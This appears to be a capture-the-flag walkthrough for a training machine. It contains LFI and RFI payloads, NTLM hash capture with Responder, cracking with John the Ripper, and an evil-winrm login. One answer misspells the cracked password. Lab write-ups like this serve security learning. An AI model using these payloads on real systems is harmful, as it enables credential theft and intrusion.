# Research

TASK 1

How many TCP ports are open on the machine?

The following missed an open TCP port

    ┌──(kali㉿kali)-[~]
    └─$ nmap 10.129.19.127 -p- -Pn -T5                                                                                                                     
    ...
    Not shown: 65533 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    80/tcp   open  http
    5985/tcp open  wsman
    
Instead,

    ┌──(kali㉿kali)-[~]
    └─$ sudo nmap -sS -p- -sV -sC  10.129.19.127                                                                                                          
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 11:17 BST
    Nmap scan report for unika.htb (10.129.19.127)
    Host is up (0.10s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
    |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
    |_http-title: Unika
    5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    7680/tcp open  pando-pub?
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 347.73 seconds

3

TASK 2

When visiting the web service using the IP address, what is the domain that we are being redirected to?

    unika.htb

TASK 3

Which scripting language is being used on the server to generate webpages?

    ┌──(kali㉿kali)-[~]
    └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://unika.htb
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://unika.htb
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2022/05/25 11:18:46 Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 298]
    /.htaccess            (Status: 403) [Size: 298]
    /.htpasswd            (Status: 403) [Size: 298]
    /aux                  (Status: 403) [Size: 298]
    /cgi-bin/             (Status: 403) [Size: 298]
    /com1                 (Status: 403) [Size: 298]
    /com2                 (Status: 403) [Size: 298]
    /com3                 (Status: 403) [Size: 298]
    /con                  (Status: 403) [Size: 298]
    /css                  (Status: 301) [Size: 328] [--> http://unika.htb/css/]
    /img                  (Status: 301) [Size: 328] [--> http://unika.htb/img/]
    /inc                  (Status: 301) [Size: 328] [--> http://unika.htb/inc/]
    /examples             (Status: 503) [Size: 398]                            
    /index.php            (Status: 200) [Size: 46453]                          
    /js                   (Status: 301) [Size: 327] [--> http://unika.htb/js/] 
    /licenses             (Status: 403) [Size: 417]                            
    /lpt1                 (Status: 403) [Size: 298]                            
    /lpt2                 (Status: 403) [Size: 298]                            
    /nul                  (Status: 403) [Size: 298]                            
    /phpmyadmin           (Status: 403) [Size: 417]                            
    /prn                  (Status: 403) [Size: 298]                                                                                                    
    /server-info          (Status: 403) [Size: 417]                                                                                                    
    /server-status        (Status: 403) [Size: 417]                                                                                                    
    /webalizer            (Status: 403) [Size: 417]                                                                                                    

    ===============================================================                                                                                    
    2022/05/25 11:19:07 Finished                                                                                                                       
    ===============================================================                                                                                    

PHP

TASK 4

What is the name of the URL parameter which is used to load different language versions of the webpage?

Top-right corner of navbar has the Language option:

    http://unika.htb/index.php?page=french.html
    
page

TASK 5

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

    http://unika.htb/index.php?page=french.html/../../../../../../../../windows/system32/drivers/etc/hosts
    
Output:

    # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 

    LFI Windows Wordlist
    https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows
    
    $ wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
    $ cat "../../../../../../../../windows/system32/drivers/etc/hosts" >> LFI-WordList-Windows
    

../../../../../../../../windows/system32/drivers/etc/hosts

TASK 6

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

    
    http://unika.htb/index.php?page=//10.10.14.6/somefile


//10.10.14.6/somefile

TASK 7

What does NTLM stand for?

New Technology LAN Manager

TASK 8

Which flag do we use in the Responder utility to specify the network interface?

    ┌──(kali㉿kali)-[~]
    └─$ sudo responder  -I tun0
    
-I

TASK 9

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

John The Ripper

TASK 10

What is the password for the administrator user?

    ┌──(kali㉿kali)-[~]
    └─$ sudo responder  -I tun0
    
    ...
    
Visit (Note the IP Address is our server

    http://unika.htb/index.php?page=//10.10.14.78/somefile
    
Response from Responder

    [+] Listening for events...                                                                                                                        

    [SMB] NTLMv2-SSP Client   : ::ffff:10.129.19.127
    [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
    [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:270ceefd628c49c7:C4C65A87FBBECA99337408BF1747BBE6:010100000000000080999F853070D8018C742037C80B748E0000000002000800330054004F00350001001E00570049004E002D00440057004E005300310050004B004B0046005A00500004003400570049004E002D00440057004E005300310050004B004B0046005A0050002E00330054004F0035002E004C004F00430041004C0003001400330054004F0035002E004C004F00430041004C0005001400330054004F0035002E004C004F00430041004C000700080080999F853070D8010600040002000000080030003000000000000000010000000020000038FE4FE5DDF0EDF7B6132129A6CEFC7272644BDA1EDAD80E411463D8403EC52B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370038000000000000000000    

    ┌──(kali㉿kali)-[/usr/share/wordlists]
    └─$ sudo gunzip rockyou.txt.gz      
    
    ┌──(kali㉿kali)-[~]
    └─$ echo "Administrator::RESPONDER:270ceefd628c49c7:C4C65A87FBBECA99337408BF1747BBE6:010100000000000080999F853070D8018C742037C80B748E0000000002000800330054004F00350001001E00570049004E002D00440057004E005300310050004B004B0046005A00500004003400570049004E002D00440057004E005300310050004B004B0046005A0050002E00330054004F0035002E004C004F00430041004C0003001400330054004F0035002E004C004F00430041004C0005001400330054004F0035002E004C004F00430041004C000700080080999F853070D8010600040002000000080030003000000000000000010000000020000038FE4FE5DDF0EDF7B6132129A6CEFC7272644BDA1EDAD80E411463D8403EC52B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370038000000000000000000" > hash.txt

    ┌──(kali㉿kali)-[~]
    └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    badminton        (Administrator)     
    1g 0:00:00:00 DONE (2022-05-25 14:46) 100.0g/s 409600p/s 409600c/s 409600C/s adriano..oooooo
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 
    
badmington

TASK 11

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

5985 / TCP

## Nikto

    ┌──(kali㉿kali)-[~]
    └─$ nikto -h http://unika.htb
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.129.19.127
    + Target Hostname:    unika.htb
    + Target Port:        80
    + Start Time:         2022-05-25 11:33:37 (GMT1)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
    + Retrieved x-powered-by header: PHP/8.1.1
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
    + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
    + /index.php: PHP include error may indicate local or remote file inclusion is possible.
    ...

## Possible CVE

PHP 8.1.1 -> CVE-2021-21708

## Evil-WinRM

Evil-WinRM is not installed by default. Install via APT `sudo apt install evil-winrm`
    
    ┌──(kali㉿kali)-[~]
    └─$ evil-winrm -i 10.129.19.127 -u Administrator -p badminton                                                                                  1 ⨯

    Evil-WinRM shell v3.3

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\Administrator\Documents>
    
    ...
    
    *Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-r---        10/11/2020   7:19 AM                3D Objects
    d-r---        10/11/2020   7:19 AM                Contacts
    d-r---          3/9/2022   5:34 PM                Desktop
    d-r---         3/10/2022   4:51 AM                Documents
    d-r---        10/11/2020   7:19 AM                Downloads
    d-r---        10/11/2020   7:19 AM                Favorites
    d-r---        10/11/2020   7:19 AM                Links
    d-r---        10/11/2020   7:19 AM                Music
    d-r---         4/27/2020   6:01 AM                OneDrive
    d-r---        10/11/2020   7:19 AM                Pictures
    d-r---        10/11/2020   7:19 AM                Saved Games
    d-r---        10/11/2020   7:19 AM                Searches
    d-r---        10/11/2020   7:19 AM                Videos


    *Evil-WinRM* PS C:\Users\Administrator> cd .
    *Evil-WinRM* PS C:\Users\Administrator> cd ..
    *Evil-WinRM* PS C:\Users> ls


        Directory: C:\Users


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----          3/9/2022   5:35 PM                Administrator
    d-----          3/9/2022   5:33 PM                mike
    d-r---        10/10/2020  12:37 PM                Public


    *Evil-WinRM* PS C:\Users> ls


        Directory: C:\Users


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----          3/9/2022   5:35 PM                Administrator
    d-----          3/9/2022   5:33 PM                mike
    d-r---        10/10/2020  12:37 PM                Public


    *Evil-WinRM* PS C:\Users> cd mike
    *Evil-WinRM* PS C:\Users\mike> ls


        Directory: C:\Users\mike


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         3/10/2022   4:51 AM                Desktop


    *Evil-WinRM* PS C:\Users\mike> cd Desktop
    *Evil-WinRM* PS C:\Users\mike\Desktop> ls


        Directory: C:\Users\mike\Desktop


    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----         3/10/2022   4:50 AM             32 flag.txt


    *Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
    ea81b7afddd03efaa0945333ed147fac
    *Evil-WinRM* PS C:\Users\mike\Desktop> 


# Reproduce

 - `-i IP_Addr` denotes the IP address of the remote management machine 

        ┌──(kali㉿kali)-[~]
        └─$ evil-winrm -i 10.129.19.127 -u Administrator -p badminton

        Evil-WinRM shell v3.3
        ...
        Info: Establishing connection to remote endpoint

        *Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\mike\Desktop\flag.txt
        ea81b7afddd03efaa0945333ed147fac

# Flag

ea81b7afddd03efaa0945333ed147fac
